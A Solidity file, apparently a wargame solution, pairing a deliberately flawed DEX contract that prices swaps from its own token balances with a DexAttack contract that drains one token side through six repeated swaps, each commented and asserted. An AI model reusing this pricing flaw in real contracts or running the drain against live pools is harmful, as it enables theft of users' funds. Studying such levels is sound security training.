// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract DexAttack {
   Dex vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  Dex(_vulnContract);
  }

  function attack() external {
    address t1 = vulnContract.token1();
    address t2 = vulnContract.token2();

    // approve dex to spend our tokens
    vulnContract.approve(address(vulnContract), 100);

    // getSwapPrice()
    // (amount * DEX.TO) / DEX.FROM
    //
    // we can keep swapping all of 1 token for the 
    // other until we have completely drained one side to 0
    //
    // T1/T2 DEX 100/100 USR 10/10 (220 tokens total)
    // 1) swap 10 from T1 to T2
    vulnContract.swap(t1, t2, 10);
    // (10 * 100) / 100 = 10
    // T1/T2 DEX 110/90 USR 0/20   
    assert(vulnContract.balanceOf(t1, address(this)) == 0);
    assert(vulnContract.balanceOf(t2, address(this)) == 20);
    assert(vulnContract.balanceOf(t1, address(vulnContract)) == 110);
    assert(vulnContract.balanceOf(t2, address(vulnContract)) == 90);
    
    // 2) swap 20 from T2 to T1
    vulnContract.swap(t2, t1, 20);
    // (20 * 110) / 90 = 24 (rounded down)
    // T1/T2 DEX 86/110 USR 24/0 
    assert(vulnContract.balanceOf(t1, address(this)) == 24);
    assert(vulnContract.balanceOf(t2, address(this)) == 0);
    assert(vulnContract.balanceOf(t1, address(vulnContract)) == 86);
    assert(vulnContract.balanceOf(t2, address(vulnContract)) == 110);
  
    // 3) swap 24 from T1 to T2 
    vulnContract.swap(t1, t2, 24);
    // (24 * 110) / 86 = 30
    // T1/T2 DEX 110/80 USR 0/30  
    assert(vulnContract.balanceOf(t1, address(this)) == 0);
    assert(vulnContract.balanceOf(t2, address(this)) == 30);
    assert(vulnContract.balanceOf(t1, address(vulnContract)) == 110);
    assert(vulnContract.balanceOf(t2, address(vulnContract)) == 80);

    // 4) swap 30 from T2 to T1
    vulnContract.swap(t2, t1, 30);
    // (30 * 110) / 80 = 41
    // T1/T2 DEX 69/110 USR 41/0
    assert(vulnContract.balanceOf(t1, address(this)) == 41);
    assert(vulnContract.balanceOf(t2, address(this)) == 0);
    assert(vulnContract.balanceOf(t1, address(vulnContract)) == 69);
    assert(vulnContract.balanceOf(t2, address(vulnContract)) == 110);

    // 5) swap 41 from T1 to T2
    vulnContract.swap(t1, t2, 41);
    // (41 * 110) / 69 = 65
    // T1/T2 DEX 110/45 USR 0/65
    assert(vulnContract.balanceOf(t1, address(this)) == 0);
    assert(vulnContract.balanceOf(t2, address(this)) == 65);
    assert(vulnContract.balanceOf(t1, address(vulnContract)) == 110);
    assert(vulnContract.balanceOf(t2, address(vulnContract)) == 45);

    // 6) swap 45 from T2 to T1
    // why 45? why not 65?
    // (65 * 110) / 45 = 158
    // but Dex only has 110 T1 tokens remaining
    // solve: (x * 110) / 45 = 110
    //        x = (110*45)/110
    //        x = 45
    vulnContract.swap(t2, t1, 45);

    assert(vulnContract.balanceOf(t1, address(this)) == 110);
    assert(vulnContract.balanceOf(t2, address(this)) == 20);
    assert(vulnContract.balanceOf(t1, address(vulnContract)) == 0); // have drained one of the token pairs
    assert(vulnContract.balanceOf(t2, address(vulnContract)) == 90);
  }
}